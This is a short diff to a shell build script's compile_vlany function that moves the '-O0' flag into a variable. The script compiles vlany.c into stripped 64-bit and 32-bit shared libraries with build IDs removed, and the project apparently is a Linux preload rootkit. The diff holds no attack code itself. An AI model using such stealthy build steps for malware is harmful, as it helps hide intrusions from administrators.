@@ -217,6 +217,7 @@ config_vlany ()
 compile_vlany ()
 {
     WARNING_FLAGS="-Wall -Wno-comment -Wno-unused-result"
+    OPTIMIZATION_FLAGS="-O0"
     OPTIONS="-fomit-frame-pointer -fPIC"
     LINKER_OPTIONS="-Wl,--build-id=none"
 
@@ -225,8 +226,8 @@ compile_vlany ()
     [ $SSL_STATUS == 0 ] && { LINKER_FLAGS="-ldl -lcrypt"; }
 
     rm -rf *.so.*
-    gcc -std=gnu99 -O0 vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.x86_64
-    gcc -m32 -std=gnu99 -O0 vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
+    gcc -std=gnu99 $OPTIMIZATION_FLAGS vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.x86_64
+    gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
     strip ${OBJECT_FILE_NAME}.so.x86_64
     strip ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
 }
